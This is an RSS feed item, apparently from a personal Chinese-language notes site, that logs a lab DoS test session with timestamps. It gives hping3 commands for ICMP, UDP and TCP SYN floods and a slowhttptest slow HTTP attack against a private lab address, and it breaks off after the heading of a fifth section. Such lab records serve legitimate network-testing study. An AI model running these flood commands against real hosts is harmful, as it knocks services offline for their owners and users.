      <guid>http://localhost:1313/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/%E8%AE%B0%E5%BD%95/</guid>
      <description>&lt;h1 id=&#34;20260402-dos攻击测试记录时间攻击类型&#34;&gt;2026.04.02 Dos攻击测试记录(时间+攻击类型)&lt;a class=&#34;anchor&#34; href=&#34;#20260402-dos%e6%94%bb%e5%87%bb%e6%b5%8b%e8%af%95%e8%ae%b0%e5%bd%95%e6%97%b6%e9%97%b4%e6%94%bb%e5%87%bb%e7%b1%bb%e5%9e%8b&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xD;&#xA;&lt;h2 id=&#34;一icmp-ddos攻击&#34;&gt;一、icmp ddos攻击&lt;a class=&#34;anchor&#34; href=&#34;#%e4%b8%80icmp-ddos%e6%94%bb%e5%87%bb&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xD;&#xA;&lt;p&gt;&lt;code&gt;17.12&lt;/code&gt;~&lt;code&gt;17.13&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-ZSH&#34; data-lang=&#34;ZSH&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo hping3 --icmp -c &lt;span style=&#34;color:#ff9f43&#34;&gt;10000&lt;/span&gt; -i u1000 172.31.132.2 &lt;span style=&#34;color:#78787e&#34;&gt;# 约0.5Mbpg&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo hping3 --icmp --flood -d &lt;span style=&#34;color:#ff9f43&#34;&gt;1200&lt;/span&gt; 172.31.132.2 &lt;span style=&#34;color:#78787e&#34;&gt;# 约100Mbps&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#78787e&#34;&gt;# 安装并运行nload查看实时带宽速率&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt update &lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo apt install nload&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nload eth0&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;二udp-ddos攻击&#34;&gt;二、udp ddos攻击&lt;a class=&#34;anchor&#34; href=&#34;#%e4%ba%8cudp-ddos%e6%94%bb%e5%87%bb&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xD;&#xA;&lt;p&gt;&lt;code&gt;17.15&lt;/code&gt;~&lt;code&gt;17.16&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-ZSH&#34; data-lang=&#34;ZSH&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo hping3 -c &lt;span style=&#34;color:#ff9f43&#34;&gt;10000&lt;/span&gt; -d &lt;span style=&#34;color:#ff9f43&#34;&gt;120&lt;/span&gt; --udp -p &lt;span style=&#34;color:#ff9f43&#34;&gt;8080&lt;/span&gt; -i u1000 172.31.132.2&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;三tcp-syn-ddos攻击&#34;&gt;三、tcp syn ddos攻击&lt;a class=&#34;anchor&#34; href=&#34;#%e4%b8%89tcp-syn-ddos%e6%94%bb%e5%87%bb&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xD;&#xA;&lt;p&gt;&lt;code&gt;17.17&lt;/code&gt;~&lt;code&gt;17.18&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-ZSH&#34; data-lang=&#34;ZSH&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo hping3 -S -p &lt;span style=&#34;color:#ff9f43&#34;&gt;8080&lt;/span&gt; -c &lt;span style=&#34;color:#ff9f43&#34;&gt;10000&lt;/span&gt; -d &lt;span style=&#34;color:#ff9f43&#34;&gt;120&lt;/span&gt; -i u1000 172.31.132.2&#x9;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;四http-dos慢速连接攻击&#34;&gt;四、HTTP Dos慢速连接攻击&lt;a class=&#34;anchor&#34; href=&#34;#%e5%9b%9bhttp-dos%e6%85%a2%e9%80%9f%e8%bf%9e%e6%8e%a5%e6%94%bb%e5%87%bb&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xD;&#xA;&lt;p&gt;&lt;code&gt;17.20&lt;/code&gt;~&lt;code&gt;17.22&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-ZSH&#34; data-lang=&#34;ZSH&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo slowhttptest -c &lt;span style=&#34;color:#ff9f43&#34;&gt;1000&lt;/span&gt; -B -g -o my_body_stats -i &lt;span style=&#34;color:#ff9f43&#34;&gt;110&lt;/span&gt; -r &lt;span style=&#34;color:#ff9f43&#34;&gt;200&lt;/span&gt; -s &lt;span style=&#34;color:#ff9f43&#34;&gt;8192&lt;/span&gt; -t FAKEVERB -u http://172.31.132.2:8080 -x &lt;span style=&#34;color:#ff9f43&#34;&gt;10&lt;/span&gt; -p &lt;span style=&#34;color:#ff9f43&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;五http-dos不完整的http请求攻击&#34;&gt;五、HTTP Dos不完整的http请求攻击&lt;a class=&#34;anchor&#34; href=&#34;#%e4%ba%94http-dos%e4%b8%8d%e5%ae%8c%e6%95%b4%e7%9a%84http%e8%af%b7%e6%b1%82%e6%94%bb%e5%87%bb&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xD;&#xA;&lt;p&gt;&lt;code&gt;17.25&lt;/code&gt;~&lt;code&gt;17.27&lt;/code&gt;&lt;/p&gt;</description>
    </item>
